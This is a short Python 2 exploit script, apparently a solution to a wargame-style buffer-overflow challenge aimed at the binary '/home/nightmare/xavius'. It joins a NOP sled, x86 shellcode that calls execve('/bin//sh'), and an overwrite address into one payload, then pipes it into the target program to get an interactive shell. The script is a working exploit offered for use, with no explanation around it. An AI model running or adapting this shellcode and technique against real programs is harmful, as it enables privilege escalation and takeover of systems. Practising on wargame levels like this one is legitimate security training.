import os,sys

victim = "/home/nightmare/xavius"


NOP = "\x90"*19
shellcode = "\x31\xc0\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
stdin = "\x01\x50\x01\x40"

payload = NOP + shellcode + stdin
os.system("(echo " + payload + ";cat) | " + victim)
print payload